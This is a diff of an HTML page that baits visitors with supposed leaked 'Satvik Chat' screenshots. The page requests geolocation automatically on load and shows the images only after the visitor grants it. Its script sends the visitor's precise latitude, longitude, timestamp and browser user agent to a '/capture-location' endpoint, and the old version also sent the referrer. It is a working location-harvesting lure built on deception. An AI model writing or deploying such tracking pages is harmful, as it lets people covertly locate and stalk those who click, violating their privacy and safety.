@@ -3,116 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satvik Chat Leaks</title>
+    <title>Satvik Chat</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            display: none;
-        }
-        .content {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
-        }
-        img {
-            max-width: 100%;
-            margin: 15px 0;
-            border: 2px solid #333;
-            border-radius: 8px;
-        }
-        .denied {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: #111;
-        }
-        button {
-            padding: 12px 24px;
-            font-size: 18px;
-            background: #ff4444;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-        }
+        body { margin:0; background:#000; color:#fff; font-family:Arial; text-align:center; }
+        .content { max-width: 700px; margin:20px auto; padding:10px; display:none; }
+        img { max-width:100%; margin:15px 0; border:2px solid #333; border-radius:8px; }
+        .denied { height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#111; }
     </style>
 </head>
 <body>
-    <div class="content" id="content">
-        <h1>Satvik Chat Screenshots</h1>
-        <p>Only visible after location permission.</p>
-        
-        <img src="https://i.imgur.com/placeholder1.jpg" alt="Screenshot 1" onerror="this.src='/static/0jAV3.png'">
-        <img src="https://i.imgur.com/placeholder2.jpg" alt="Screenshot 2" onerror="this.src='/static/dX66Z.png'">
-        <img src="https://i.imgur.com/placeholder3.jpg" alt="Screenshot 3" onerror="this.src='/static/JQyOg.png'">
-        <img src="https://i.imgur.com/placeholder4.jpg" alt="Screenshot 4" onerror="this.src='/static/aryUv.png'">
-        <img src="https://i.imgur.com/placeholder5.jpg" alt="Screenshot 5" onerror="this.src='/static/CiyTj.png'">
-        
-        <p style="color:#888; margin-top:30px;">Location captured and sent.</p>
-    </div>
 
     <div class="denied" id="denied">
-        <h2>Location Required</h2>
-        <p>Please allow location access to view the content.</p>
-        <button onclick="requestLocation()">Allow Location</button>
+        <h2>Location Access Required</h2>
+        <p>Please allow location to view the screenshots.</p>
+        <button onclick="requestLocation()" style="padding:15px 30px; font-size:18px;">Allow Location</button>
+    </div>
+
+    <div class="content" id="content">
+        <h1>Satvik Chat Screenshots</h1>
+        
+        <img src="/static/0jAV3.png" alt="1">
+        <img src="/static/dX66Z.png" alt="2">
+        <img src="/static/JQyOg.png" alt="3">
+        <img src="/static/aryUv.png" alt="4">
+        <img src="/static/CiyTj.png" alt="5">
     </div>
 
     <script>
-        let locationSent = false;
-
-        function sendLocationToServer(lat, lon) {
-            if (locationSent) return;
-            locationSent = true;
-
-            fetch('/capture-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    latitude: lat,
-                    longitude: lon,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    referrer: document.referrer
-                })
-            }).catch(err => console.error('Location send failed:', err));
-        }
-
         function requestLocation() {
-            if (!navigator.geolocation) {
-                alert("Geolocation not supported by your browser.");
-                return;
-            }
-
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const { latitude, longitude } = position.coords;
-                    sendLocationToServer(latitude, longitude);
+                (pos) => {
+                    fetch('/capture-location', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                        })
+                    });
                     document.getElementById('denied').style.display = 'none';
-                    document.getElementById('content').parentElement.style.display = 'block';
+                    document.getElementById('content').style.display = 'block';
                 },
-                (error) => {
-                    let msg = "Location access denied.";
-                    if (error.code === error.PERMISSION_DENIED) msg = "Permission denied. Cannot view without location.";
-                    else if (error.code === error.POSITION_UNAVAILABLE) msg = "Location unavailable.";
-                    else if (error.code === error.TIMEOUT) msg = "Location request timeout.";
-                    
-                    alert(msg + "\n\nRefresh the page and allow location to proceed.");
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                () => alert("Location access denied. Cannot show content.")
             );
         }
-
-        // Auto request on load
-        window.onload = () => {
-            requestLocation();
-        };
+        // Auto trigger
+        window.onload = requestLocation;
     </script>
 </body>
 </html>
